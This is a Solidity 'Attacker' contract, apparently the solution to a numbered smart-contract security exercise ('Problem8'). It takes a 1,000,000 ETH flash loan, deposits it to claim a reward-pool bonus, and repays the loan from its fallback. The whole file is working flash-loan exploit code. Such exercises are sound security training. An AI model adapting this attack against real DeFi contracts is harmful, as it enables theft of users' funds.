// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanPool, RewardPool} from "../src/Problem8.sol";

contract Attacker {

    FlashLoanPool loanPool; // The smart contract that offers flash loans.
    RewardPool rewardPool; // The smart contract whose rewards we need to drain.

    // Initialize contract variables.
    constructor(FlashLoanPool _flashloan, RewardPool _reward) {
        loanPool = _flashloan;
        rewardPool = _reward;
    }

    // Loan 1,000,000 ETH from the loan pool.
    function attack() public {
        loanPool.flashLoan(1000000 ether);
    }

    // Upon receiving 1,000,000 ETH, deposit and claim in the
    // reward pool. This should earn us 1,000 ETH as a bonus.
    function receiveFlashLoan(uint256 loanAmount) public payable {
        rewardPool.deposit{value: 1000000 ether}();
        rewardPool.claim();
    }

    // fallback() is called twice. The first time it's called
    // is when we receive the loan. We should do nothing then
    // because reveiveFlashLoan() handles that.
    //
    // The second time it is called is when we claim our
    // reward. That's when we repay the loan.
    fallback() external payable {
        if (address(this).balance == 1001000 ether) {
            payable(address(loanPool)).call{value: 1000000 ether}("");
        }
    }

}